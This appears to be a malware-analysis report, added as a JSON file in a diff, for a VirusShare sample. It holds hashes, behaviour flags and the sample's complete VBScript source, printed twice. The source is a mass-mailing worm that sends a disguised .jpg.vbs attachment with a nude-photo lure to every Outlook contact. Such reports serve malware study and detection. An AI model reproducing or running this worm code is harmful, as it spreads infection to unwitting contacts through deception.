@@ -1,0 +1,50 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "'VBS.little by Negral (c)2002\nDim x \non error resume next \nSet ol=CreateObject(\"Outlook.Application\") \nSet out= WScript.CreateObject(\"Outlook.Application\") \nSet mapi = out.GetNameSpace(\"MAPI\") \nSet a = mapi.AddressLists(1) \nFor x=1 To a.AddressEntries.Count \nSet Mail=ol.CreateItem(0) \nMail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x) \nMail.Subject=\"Wanna see ...\" \nMail.Body=\"this little pic of me naked?\" \nMail.Attachments.Add(\"C:\\littleb.jpg.vbs\") \nMail.Send \nNext \nol.Quit "
+    },
+    "filename": "VirusShare_14d74038941aba45e32e45e295ae7273",
+    "filesize": 511,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "14d74038941aba45e32e45e295ae7273",
+        "sha1": "af6024091bd9ff5b2271dee32eefc5ad6a2c529a",
+        "sha256": "cd5bf6b3be48008c631013156b31b4c6ca3b22900d6d040af660a7c2995828db"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'VBS.little by Negral (c)2002",
+            "Dim x ",
+            "on error resume next ",
+            "Set ol=CreateObject(\"Outlook.Application\") ",
+            "Set out= WScript.CreateObject(\"Outlook.Application\") ",
+            "Set mapi = out.GetNameSpace(\"MAPI\") ",
+            "Set a = mapi.AddressLists(1) ",
+            "For x=1 To a.AddressEntries.Count ",
+            "Set Mail=ol.CreateItem(0) ",
+            "Mail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x) ",
+            "Mail.Subject=\"Wanna see ...\" ",
+            "Mail.Body=\"this little pic of me naked?\" ",
+            "Mail.Attachments.Add(\"C:\\littleb.jpg.vbs\") ",
+            "Mail.Send ",
+            "Next ",
+            "ol.Quit "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.282016",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
